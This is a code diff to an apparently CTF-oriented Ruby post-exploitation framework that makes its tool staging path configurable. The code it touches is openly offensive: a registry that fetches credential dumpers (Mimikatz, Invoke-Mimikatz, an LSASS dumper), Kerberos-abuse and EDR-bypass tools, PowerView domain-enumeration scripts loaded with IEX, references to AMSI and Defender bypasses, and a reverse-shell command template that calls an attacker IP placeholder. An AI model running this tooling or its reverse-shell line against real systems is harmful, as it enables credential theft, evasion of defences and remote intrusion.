@@ -11,6 +11,7 @@ require 'digest/sha1'
 require 'readline'
 require 'shellwords'
 require 'evil_ctf/uploader'
+require_relative 'staging'
 require_relative '../config/profiles'
 require_relative 'tools/downloader'
 require_relative 'tools/stager'
@@ -22,204 +23,220 @@ require_relative 'tools/loot_store'
 
 module EvilCTF
   module Tools
-    TOOL_REGISTRY = {
-      'sharphound' => {
-        name: 'SharpHound (BloodHound Collector)',
-        filename: 'SharpHound.exe',
-        search_patterns: ['SharpHound.exe', 'SharpHound*.exe'],
-        description: 'BloodHound AD collector',
-        url: 'https://github.com/SpecterOps/SharpHound',
-        download_url: 'https://github.com/SpecterOps/SharpHound/releases/latest/download/SharpHound.exe',
-        backup_urls: [
-          'https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHound.exe'
-        ],
-        zip: false,
-        recommended_remote: 'C:\\Users\\Public\\SharpHound.exe',
-        auto_execute: false,
-        category: 'recon'
-      },
-      'mimikatz' => {
-        name: 'Mimikatz',
-        filename: 'mimikatz_trunk.zip',
-        search_patterns: ['mimikatz.exe', 'mimikatz_x64.exe'],
-        description: 'Credential dumping tool',
-        url: 'https://github.com/ParrotSec/mimikatz',
-        download_url: 'https://github.com/ParrotSec/mimikatz/releases/latest/download/mimikatz_trunk.zip',
-        backup_urls: [
-          'https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip'
-        ],
-        zip: true,
-        zip_pick_x64: 'mimikatz_trunk/x64/mimikatz.exe',
-        zip_pick_x86: 'mimikatz_trunk/win32/mimikatz.exe',
-        recommended_remote: 'C:\\Users\\Public\\mimikatz.exe',
-        auto_execute: false,
-        category: 'privilege'
-      },
-      'powerview' => {
-        name: 'PowerView',
-        filename: 'PowerView.ps1',
-        search_patterns: ['PowerView.ps1', 'PowerView*.ps1'],
-        description: 'AD recon PowerShell script',
-        url: 'https://github.com/BC-SECURITY/Empire',
-        download_url: 'https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/modules/powershell/situational_awareness/network/powerview.ps1',
-        backup_urls: [
-          'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1',
-          'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1'
-        ],
-        zip: false,
-        recommended_remote: 'C:\\Users\\Public\\PowerView.ps1',
-        auto_execute: false,
-        category: 'recon'
-      },
-      'rubeus' => {
-        name: 'Rubeus',
-        filename: 'Rubeus.exe',
-        search_patterns: ['Rubeus.exe', 'Rubeus*.exe'],
-        description: 'Kerberos abuse / roasting tool',
-        url: 'https://github.com/GhostPack/Rubeus',
-        download_url: 'https://github.com/giveen/compiled-exploit-binaries/blob/main/Rubeus.exe',
-        backup_urls: [
-          'https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/CompiledBinaries/Rubeus.exe'
-        ],
-        zip: false,
-        recommended_remote: 'C:\\Users\\Public\\Rubeus.exe',
-        auto_execute: false,
-        category: 'privilege'
-      },
-      'seatbelt' => {
-        name: 'Seatbelt',
-        filename: 'Seatbelt.exe',
-        search_patterns: ['Seatbelt.exe', 'Seatbelt*.exe'],
-        description: 'Security auditing tool',
-        url: 'https://github.com/GhostPack/Seatbelt',
-        download_url: 'https://github.com/GhostPack/Seatbelt/releases/latest/download/Seatbelt.exe',
-        backup_urls: [
-          'https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/CompiledBinaries/Seatbelt.exe'
-        ],
-        zip: false,
-        recommended_remote: 'C:\\Users\\Public\\Seatbelt.exe',
-        auto_execute: false,
-        category: 'recon'
-      },
-      'inveigh' => {
-        name: 'Inveigh',
-        filename: 'Inveigh.ps1',
-        search_patterns: ['Inveigh.ps1', 'Inveigh*.ps1'],
-        description: 'LLMNR/mDNS/NBNS spoofer / MITM',
-        url: 'https://github.com/Kevin-Robertson/Inveigh',
-        download_url: 'https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1',
-        backup_urls: [
-          'https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.psm1'
-        ],
-        zip: false,
-        recommended_remote: 'C:\\Users\\Public\\Inveigh.ps1',
-        auto_execute: false,
-        category: 'privilege'
-      },
-      'procdump' => {
-        name: 'ProcDump',
-        filename: 'procdump64.exe', # Will be adjusted based on architecture
-        search_patterns: ['procdump.exe', 'procdump64.exe'],
-        description: 'Sysinternals LSASS dumper',
-        url: 'https://learn.microsoft.com/en-us/sysinternals/downloads/procdump',
-        download_url: 'https://live.sysinternals.com/procdump64.exe',
-        backup_urls: [
-          'https://live.sysinternals.com/procdump.exe'
-        ],
-        zip: false,
-        recommended_remote: 'C:\\Users\\Public\\procdump64.exe',
-        auto_execute: false,
-        category: 'privilege'
-      },
-      'winpeas' => {
-        name: 'WinPEAS',
-        filename: 'winPEASany_ofs.exe',
-        search_patterns: ['winPEAS*.exe', 'winPEASany*.exe'],
-        description: 'Windows privilege escalation checker',
-        url: 'https://github.com/peass-ng/PEASS-ng',
-        download_url: 'https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe',
-        backup_urls: [
-          'https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe'
-        ],
-        zip: false,
-        recommended_remote: 'C:\\Users\\Public\\winPEAS.exe',
-        auto_execute: false,
-        category: 'privilege'
-      },
-      'invoke_mimikatz' => {
-        name: 'Invoke-Mimikatz',
-        filename: 'Invoke-Mimikatz.ps1',
-        search_patterns: ['Invoke-Mimikatz.ps1'],
-        description: 'PowerShell version of Mimikatz for credential extraction',
-        url: 'https://github.com/PowerShellMafia/PowerSploit',
-        download_url: 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1',
-        backup_urls: [
-          'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'
-        ],
-        zip: false,
-        recommended_remote: 'C:\\Users\\Public\\Invoke-Mimikatz.ps1',
-        auto_execute: false,
-        category: 'privilege'
-      },
-      'nishang' => {
-        name: 'Nishang',
-        filename: 'nishang.zip',
-        search_patterns: ['nishang.zip', 'nishang-master.zip'],
-        description: 'Offensive PowerShell scripts collection',
-        url: 'https://github.com/samratashok/nishang',
-        download_url: 'https://github.com/samratashok/nishang/archive/refs/heads/master.zip',
-        backup_urls: [],
-        zip: true,
-        zip_pick: 'nishang-master',
-        recommended_remote: 'C:\\Users\\Public\\nishang-master',
-        auto_execute: false,
-        category: 'recon'
-      },
-      'socksproxy' => {
-        name: 'Invoke-SocksProxy',
-        filename: 'Invoke-SocksProxy.psm1',
-        search_patterns: ['Invoke-SocksProxy.psm1', 'Invoke-SocksProxy.ps1'],
-        description: 'SOCKS pivot via PowerShell module',
-        url: 'https://github.com/p3nt4/Invoke-SocksProxy',
-        download_url: 'https://raw.githubusercontent.com/p3nt4/Invoke-SocksProxy/master/Invoke-SocksProxy.psm1',
-        backup_urls: [
-          'https://raw.githubusercontent.com/p3nt4/Invoke-SocksProxy/main/Invoke-SocksProxy.psm1'
-        ],
-        zip: false,
-        recommended_remote: 'C:\\Users\\Public\\socks.ps1',
-        auto_execute: false,
-        category: 'pivot'
-      },
-      'plink' => {
-        name: 'Plink',
-        filename: 'plink.exe',
-        search_patterns: ['plink.exe', 'plink*.exe'],
-        description: 'PuTTY Link - SSH tunnel tool',
-        url: 'https://www.chiark.greenend.org.uk/~sgtatham/putty/',
-        download_url: 'https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe',
-        backup_urls: [
-          'https://the.earth.li/~sgtatham/putty/latest/w32/plink.exe'
-        ],
-        zip: false,
-        recommended_remote: 'C:\\Users\\Public\\plink.exe',
-        auto_execute: false,
-        category: 'pivot'
-      },
-      'edr_redir' => {
-        name: 'EDR-Redir V2',
-        filename: 'EDR-Redir_2.0.zip',
-        search_patterns: ['EDR-Redir.exe'],
-        description: 'EDR bypass tool using bind links',
-        url: 'https://github.com/TwoSevenOneT/EDR-Redir',
-        download_url: 'https://github.com/TwoSevenOneT/EDR-Redir/releases/download/V2/EDR-Redir_2.0.zip',
-        backup_urls: [],
-        zip: true,
-        zip_pick_x64: 'EDR-Redir.exe',
-        recommended_remote: 'C:\\Users\\Public\\EDR-Redir.exe',
-        auto_execute: false,
-        category: 'pivot'
-      }
-    }.freeze
+    # Tool catalog, built lazily and cached per staging directory: the
+    # recommended_remote values derive from EvilCTF::Staging (configurable
+    # via --staging-path / the staging_path profile key).
+    def self.tool_registry
+      if @tool_registry_for != EvilCTF::Staging.dir
+        @tool_registry = build_tool_registry
+        @tool_registry_for = EvilCTF::Staging.dir
+      end
+      @tool_registry
+    end
+
+    # rubocop:disable Metrics/MethodLength -- data catalog, not logic
+    def self.build_tool_registry
+      {
+        'sharphound' => {
+          name: 'SharpHound (BloodHound Collector)',
+          filename: 'SharpHound.exe',
+          search_patterns: ['SharpHound.exe', 'SharpHound*.exe'],
+          description: 'BloodHound AD collector',
+          url: 'https://github.com/SpecterOps/SharpHound',
+          download_url: 'https://github.com/SpecterOps/SharpHound/releases/latest/download/SharpHound.exe',
+          backup_urls: [
+            'https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHound.exe'
+          ],
+          zip: false,
+          recommended_remote: EvilCTF::Staging.tool_path('SharpHound.exe'),
+          auto_execute: false,
+          category: 'recon'
+        },
+        'mimikatz' => {
+          name: 'Mimikatz',
+          filename: 'mimikatz_trunk.zip',
+          search_patterns: ['mimikatz.exe', 'mimikatz_x64.exe'],
+          description: 'Credential dumping tool',
+          url: 'https://github.com/ParrotSec/mimikatz',
+          download_url: 'https://github.com/ParrotSec/mimikatz/releases/latest/download/mimikatz_trunk.zip',
+          backup_urls: [
+            'https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip'
+          ],
+          zip: true,
+          zip_pick_x64: 'mimikatz_trunk/x64/mimikatz.exe',
+          zip_pick_x86: 'mimikatz_trunk/win32/mimikatz.exe',
+          recommended_remote: EvilCTF::Staging.tool_path('mimikatz.exe'),
+          auto_execute: false,
+          category: 'privilege'
+        },
+        'powerview' => {
+          name: 'PowerView',
+          filename: 'PowerView.ps1',
+          search_patterns: ['PowerView.ps1', 'PowerView*.ps1'],
+          description: 'AD recon PowerShell script',
+          url: 'https://github.com/BC-SECURITY/Empire',
+          download_url: 'https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/modules/powershell/situational_awareness/network/powerview.ps1',
+          backup_urls: [
+            'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1',
+            'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1'
+          ],
+          zip: false,
+          recommended_remote: EvilCTF::Staging.tool_path('PowerView.ps1'),
+          auto_execute: false,
+          category: 'recon'
+        },
+        'rubeus' => {
+          name: 'Rubeus',
+          filename: 'Rubeus.exe',
+          search_patterns: ['Rubeus.exe', 'Rubeus*.exe'],
+          description: 'Kerberos abuse / roasting tool',
+          url: 'https://github.com/GhostPack/Rubeus',
+          download_url: 'https://github.com/giveen/compiled-exploit-binaries/blob/main/Rubeus.exe',
+          backup_urls: [
+            'https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/CompiledBinaries/Rubeus.exe'
+          ],
+          zip: false,
+          recommended_remote: EvilCTF::Staging.tool_path('Rubeus.exe'),
+          auto_execute: false,
+          category: 'privilege'
+        },
+        'seatbelt' => {
+          name: 'Seatbelt',
+          filename: 'Seatbelt.exe',
+          search_patterns: ['Seatbelt.exe', 'Seatbelt*.exe'],
+          description: 'Security auditing tool',
+          url: 'https://github.com/GhostPack/Seatbelt',
+          download_url: 'https://github.com/GhostPack/Seatbelt/releases/latest/download/Seatbelt.exe',
+          backup_urls: [
+            'https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/CompiledBinaries/Seatbelt.exe'
+          ],
+          zip: false,
+          recommended_remote: EvilCTF::Staging.tool_path('Seatbelt.exe'),
+          auto_execute: false,
+          category: 'recon'
+        },
+        'inveigh' => {
+          name: 'Inveigh',
+          filename: 'Inveigh.ps1',
+          search_patterns: ['Inveigh.ps1', 'Inveigh*.ps1'],
+          description: 'LLMNR/mDNS/NBNS spoofer / MITM',
+          url: 'https://github.com/Kevin-Robertson/Inveigh',
+          download_url: 'https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1',
+          backup_urls: [
+            'https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.psm1'
+          ],
+          zip: false,
+          recommended_remote: EvilCTF::Staging.tool_path('Inveigh.ps1'),
+          auto_execute: false,
+          category: 'privilege'
+        },
+        'procdump' => {
+          name: 'ProcDump',
+          filename: 'procdump64.exe', # Will be adjusted based on architecture
+          search_patterns: ['procdump.exe', 'procdump64.exe'],
+          description: 'Sysinternals LSASS dumper',
+          url: 'https://learn.microsoft.com/en-us/sysinternals/downloads/procdump',
+          download_url: 'https://live.sysinternals.com/procdump64.exe',
+          backup_urls: [
+            'https://live.sysinternals.com/procdump.exe'
+          ],
+          zip: false,
+          recommended_remote: EvilCTF::Staging.tool_path('procdump64.exe'),
+          auto_execute: false,
+          category: 'privilege'
+        },
+        'winpeas' => {
+          name: 'WinPEAS',
+          filename: 'winPEASany_ofs.exe',
+          search_patterns: ['winPEAS*.exe', 'winPEASany*.exe'],
+          description: 'Windows privilege escalation checker',
+          url: 'https://github.com/peass-ng/PEASS-ng',
+          download_url: 'https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe',
+          backup_urls: [
+            'https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe'
+          ],
+          zip: false,
+          recommended_remote: EvilCTF::Staging.tool_path('winPEAS.exe'),
+          auto_execute: false,
+          category: 'privilege'
+        },
+        'invoke_mimikatz' => {
+          name: 'Invoke-Mimikatz',
+          filename: 'Invoke-Mimikatz.ps1',
+          search_patterns: ['Invoke-Mimikatz.ps1'],
+          description: 'PowerShell version of Mimikatz for credential extraction',
+          url: 'https://github.com/PowerShellMafia/PowerSploit',
+          download_url: 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1',
+          backup_urls: [
+            'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'
+          ],
+          zip: false,
+          recommended_remote: EvilCTF::Staging.tool_path('Invoke-Mimikatz.ps1'),
+          auto_execute: false,
+          category: 'privilege'
+        },
+        'nishang' => {
+          name: 'Nishang',
+          filename: 'nishang.zip',
+          search_patterns: ['nishang.zip', 'nishang-master.zip'],
+          description: 'Offensive PowerShell scripts collection',
+          url: 'https://github.com/samratashok/nishang',
+          download_url: 'https://github.com/samratashok/nishang/archive/refs/heads/master.zip',
+          backup_urls: [],
+          zip: true,
+          zip_pick: 'nishang-master',
+          recommended_remote: EvilCTF::Staging.tool_path('nishang-master'),
+          auto_execute: false,
+          category: 'recon'
+        },
+        'socksproxy' => {
+          name: 'Invoke-SocksProxy',
+          filename: 'Invoke-SocksProxy.psm1',
+          search_patterns: ['Invoke-SocksProxy.psm1', 'Invoke-SocksProxy.ps1'],
+          description: 'SOCKS pivot via PowerShell module',
+          url: 'https://github.com/p3nt4/Invoke-SocksProxy',
+          download_url: 'https://raw.githubusercontent.com/p3nt4/Invoke-SocksProxy/master/Invoke-SocksProxy.psm1',
+          backup_urls: [
+            'https://raw.githubusercontent.com/p3nt4/Invoke-SocksProxy/main/Invoke-SocksProxy.psm1'
+          ],
+          zip: false,
+          recommended_remote: EvilCTF::Staging.tool_path('socks.ps1'),
+          auto_execute: false,
+          category: 'pivot'
+        },
+        'plink' => {
+          name: 'Plink',
+          filename: 'plink.exe',
+          search_patterns: ['plink.exe', 'plink*.exe'],
+          description: 'PuTTY Link - SSH tunnel tool',
+          url: 'https://www.chiark.greenend.org.uk/~sgtatham/putty/',
+          download_url: 'https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe',
+          backup_urls: [
+            'https://the.earth.li/~sgtatham/putty/latest/w32/plink.exe'
+          ],
+          zip: false,
+          recommended_remote: EvilCTF::Staging.tool_path('plink.exe'),
+          auto_execute: false,
+          category: 'pivot'
+        },
+        'edr_redir' => {
+          name: 'EDR-Redir V2',
+          filename: 'EDR-Redir_2.0.zip',
+          search_patterns: ['EDR-Redir.exe'],
+          description: 'EDR bypass tool using bind links',
+          url: 'https://github.com/TwoSevenOneT/EDR-Redir',
+          download_url: 'https://github.com/TwoSevenOneT/EDR-Redir/releases/download/V2/EDR-Redir_2.0.zip',
+          backup_urls: [],
+          zip: true,
+          zip_pick_x64: 'EDR-Redir.exe',
+          recommended_remote: EvilCTF::Staging.tool_path('EDR-Redir.exe'),
+          auto_execute: false,
+          category: 'pivot'
+        }
+      }.freeze
+    end
+    # rubocop:enable Metrics/MethodLength
+
     # AMSI bypass script
     BYPASS_4MSI_PS = <<~PS
       try {
@@ -328,81 +345,91 @@ module EvilCTF
       "[+] Bypass verification complete"
     PS
 
-    POWERVIEW_ALL_PS = <<~PS
-      try {
-        $cs = Get-WmiObject Win32_ComputerSystem -ErrorAction Stop
-        if (-not $cs.PartOfDomain) {
-          Write-Output "[!] Host is not domain joined. Skipping PowerView domain enumeration."
-          return
-        }
-
-        IEX (Get-Content "C:\Users\Public\PowerView.ps1" -Raw)
-
-        $commands = @(
-          @{ Name = 'Get-DomainUser'; Action = { Get-DomainUser -ErrorAction Stop } },
-          @{ Name = 'Get-DomainGroup'; Action = { Get-DomainGroup -ErrorAction Stop } },
-          @{ Name = 'Get-DomainComputer'; Action = { Get-DomainComputer -ErrorAction Stop } },
-          @{ Name = 'Get-DomainPolicy'; Action = { Get-DomainPolicy -ErrorAction Stop } },
-          @{ Name = 'Get-DomainTrust'; Action = { Get-DomainTrust -ErrorAction Stop } }
-        )
-
-        foreach ($command in $commands) {
-          try {
-            Write-Output "=== $($command.Name) ==="
-            & $command.Action
-          } catch {
-            Write-Output "[!] $($command.Name) failed: $($_.Exception.Message)"
+    # Built lazily so the PowerView path follows the configured staging dir.
+    def self.powerview_all_ps
+      <<~PS
+        try {
+          $cs = Get-WmiObject Win32_ComputerSystem -ErrorAction Stop
+          if (-not $cs.PartOfDomain) {
+            Write-Output "[!] Host is not domain joined. Skipping PowerView domain enumeration."
+            return
           }
-        }
-      } catch {
-        Write-Output "[!] PowerView enumeration aborted: $($_.Exception.Message)"
-      }
-    PS
 
-    DOM_ENUM_PS = <<~PS
-      try {
-        $cs = Get-WmiObject Win32_ComputerSystem -ErrorAction Stop
-        if (-not $cs.PartOfDomain) {
-          Write-Output "[!] Host is not domain joined. Skipping dom_enum enumeration."
-          return
-        }
+          IEX (Get-Content "#{EvilCTF::Staging.tool_path('PowerView.ps1')}" -Raw)
 
-        IEX (Get-Content "C:\Users\Public\PowerView.ps1" -Raw)
+          $commands = @(
+            @{ Name = 'Get-DomainUser'; Action = { Get-DomainUser -ErrorAction Stop } },
+            @{ Name = 'Get-DomainGroup'; Action = { Get-DomainGroup -ErrorAction Stop } },
+            @{ Name = 'Get-DomainComputer'; Action = { Get-DomainComputer -ErrorAction Stop } },
+            @{ Name = 'Get-DomainPolicy'; Action = { Get-DomainPolicy -ErrorAction Stop } },
+            @{ Name = 'Get-DomainTrust'; Action = { Get-DomainTrust -ErrorAction Stop } }
+          )
 
-        $commands = @(
-          @{ Name = 'Get-Domain'; Action = { Get-Domain -ErrorAction Stop } },
-          @{ Name = 'Get-DomainController'; Action = { Get-DomainController -ErrorAction Stop } },
-          @{ Name = 'Get-DomainUser'; Action = { Get-DomainUser -ErrorAction Stop } },
-          @{ Name = 'Get-DomainGroup'; Action = { Get-DomainGroup -ErrorAction Stop } },
-          @{ Name = 'Get-DomainComputer'; Action = { Get-DomainComputer -ErrorAction Stop } },
-          @{ Name = 'Get-DomainPolicy'; Action = { Get-DomainPolicy -ErrorAction Stop } },
-          @{ Name = 'Get-DomainGPO'; Action = { Get-DomainGPO -ErrorAction Stop } },
-          @{ Name = 'Get-DomainOU'; Action = { Get-DomainOU -ErrorAction Stop } },
-          @{ Name = 'Get-DomainTrust'; Action = { Get-DomainTrust -ErrorAction Stop } },
-          @{ Name = 'Get-ForestDomain'; Action = { Get-ForestDomain -ErrorAction Stop } },
-          @{ Name = 'Find-DomainShare'; Action = { Find-DomainShare -ErrorAction Stop } },
-          @{ Name = 'Get-DomainFileServer'; Action = { Get-DomainFileServer -ErrorAction Stop } },
-          @{ Name = 'Get-DomainForeignUser'; Action = { Get-DomainForeignUser -ErrorAction Stop } },
-          @{ Name = 'Get-DomainForeignGroupMember'; Action = { Get-DomainForeignGroupMember -ErrorAction Stop } },
-          @{ Name = 'Find-InterestingDomainAcl'; Action = { Find-InterestingDomainAcl -ErrorAction Stop } }
-        )
-
-        foreach ($command in $commands) {
-          try {
-            Write-Output "=== $($command.Name) ==="
-            & $command.Action
-          } catch {
-            Write-Output "[!] $($command.Name) failed: $($_.Exception.Message)"
+          foreach ($command in $commands) {
+            try {
+              Write-Output "=== $($command.Name) ==="
+              & $command.Action
+            } catch {
+              Write-Output "[!] $($command.Name) failed: $($_.Exception.Message)"
+            }
           }
+        } catch {
+          Write-Output "[!] PowerView enumeration aborted: $($_.Exception.Message)"
         }
-      } catch {
-        Write-Output "[!] dom_enum aborted: $($_.Exception.Message)"
-      }
-    PS
+      PS
+    end
 
-    NISHANG_REV_REMOTE = 'C:\Users\Public\nishang-master\Shells\Invoke-PowerShellTcp.ps1'
+    # Built lazily so the PowerView path follows the configured staging dir.
+    def self.dom_enum_ps
+      <<~PS
+        try {
+          $cs = Get-WmiObject Win32_ComputerSystem -ErrorAction Stop
+          if (-not $cs.PartOfDomain) {
+            Write-Output "[!] Host is not domain joined. Skipping dom_enum enumeration."
+            return
+          }
+
+          IEX (Get-Content "#{EvilCTF::Staging.tool_path('PowerView.ps1')}" -Raw)
+
+          $commands = @(
+            @{ Name = 'Get-Domain'; Action = { Get-Domain -ErrorAction Stop } },
+            @{ Name = 'Get-DomainController'; Action = { Get-DomainController -ErrorAction Stop } },
+            @{ Name = 'Get-DomainUser'; Action = { Get-DomainUser -ErrorAction Stop } },
+            @{ Name = 'Get-DomainGroup'; Action = { Get-DomainGroup -ErrorAction Stop } },
+            @{ Name = 'Get-DomainComputer'; Action = { Get-DomainComputer -ErrorAction Stop } },
+            @{ Name = 'Get-DomainPolicy'; Action = { Get-DomainPolicy -ErrorAction Stop } },
+            @{ Name = 'Get-DomainGPO'; Action = { Get-DomainGPO -ErrorAction Stop } },
+            @{ Name = 'Get-DomainOU'; Action = { Get-DomainOU -ErrorAction Stop } },
+            @{ Name = 'Get-DomainTrust'; Action = { Get-DomainTrust -ErrorAction Stop } },
+            @{ Name = 'Get-ForestDomain'; Action = { Get-ForestDomain -ErrorAction Stop } },
+            @{ Name = 'Find-DomainShare'; Action = { Find-DomainShare -ErrorAction Stop } },
+            @{ Name = 'Get-DomainFileServer'; Action = { Get-DomainFileServer -ErrorAction Stop } },
+            @{ Name = 'Get-DomainForeignUser'; Action = { Get-DomainForeignUser -ErrorAction Stop } },
+            @{ Name = 'Get-DomainForeignGroupMember'; Action = { Get-DomainForeignGroupMember -ErrorAction Stop } },
+            @{ Name = 'Find-InterestingDomainAcl'; Action = { Find-InterestingDomainAcl -ErrorAction Stop } }
+          )
+
+          foreach ($command in $commands) {
+            try {
+              Write-Output "=== $($command.Name) ==="
+              & $command.Action
+            } catch {
+              Write-Output "[!] $($command.Name) failed: $($_.Exception.Message)"
+            }
+          }
+        } catch {
+          Write-Output "[!] dom_enum aborted: $($_.Exception.Message)"
+        }
+      PS
+    end
+
+    def self.nishang_rev_remote
+      EvilCTF::Staging.tool_path('nishang-master/Shells/Invoke-PowerShellTcp.ps1')
+    end
     NISHANG_REV_PS = 'IEX (Get-Content "[NishangRevRemote]" -Raw); Invoke-PowerShellTcp -Reverse -IPAddress [AttackerIP] -Port [AttackerPort]'
-    INVEIGH_REMOTE = 'C:\Users\Public\Inveigh.ps1'
+    def self.inveigh_remote
+      EvilCTF::Staging.tool_path('Inveigh.ps1')
+    end
     INVEIGH_START_PS = 'IEX (Get-Content "[InveighRemote]" -Raw); Invoke-Inveigh -ConsoleOutput N -FileOutput Y'
 
     def self.disable_defender(shell)
@@ -513,7 +540,7 @@ module EvilCTF
     def self.download_tool(key, remote_download: false, shell: nil)
       Downloader.download_tool(
         key,
-        registry: TOOL_REGISTRY,
+        registry: tool_registry,
         remote_download: remote_download,
         shell: shell
       )
@@ -525,7 +552,7 @@ module EvilCTF
 
     def self.download_missing_tools(remote_download: false, shell: nil)
       Downloader.download_missing_tools(
-        registry: TOOL_REGISTRY,
+        registry: tool_registry,
         remote_download: remote_download,
         shell: shell
       )
@@ -538,13 +565,13 @@ module EvilCTF
         shell,
         options,
         logger,
-        registry: TOOL_REGISTRY,
+        registry: tool_registry,
         download_tool_proc: method(:download_tool)
       )
     end
 
     def self.execute_staged_tool(key, args, shell, remote_path: nil)
-      Stager.execute_staged_tool(key, args, shell, registry: TOOL_REGISTRY, remote_path: remote_path)
+      Stager.execute_staged_tool(key, args, shell, registry: tool_registry, remote_path: remote_path)
     end
 
     def self.locate_extracted_remote_path(shell, recommended_remote, extracted_file)
@@ -552,7 +579,7 @@ module EvilCTF
     end
 
     def self.list_available_tools
-      CatalogRenderer.list_available_tools(registry: TOOL_REGISTRY)
+      CatalogRenderer.list_available_tools(registry: tool_registry)
     end
 
     # Helper functions for loot handling
@@ -569,7 +596,7 @@ module EvilCTF
     end
 
     def self.find_tool_on_disk(tool_key)
-      Stager.find_tool_on_disk(tool_key, registry: TOOL_REGISTRY)
+      Stager.find_tool_on_disk(tool_key, registry: tool_registry)
     end
 
     def self.get_system_architecture(shell)
@@ -581,7 +608,7 @@ module EvilCTF
     PROFILE_SAFE_KEYS = %i[
       ip user username port ssl transport kerberos realm keytab
       proxy webhook banner_mode debug stealth random_names auto_evasion
-      beacon fresh auto_exec ipv6 ipv6_hostname user_agent
+      beacon fresh auto_exec ipv6 ipv6_hostname user_agent staging_path
     ].freeze
 
     def self.save_config_profile(name, options)
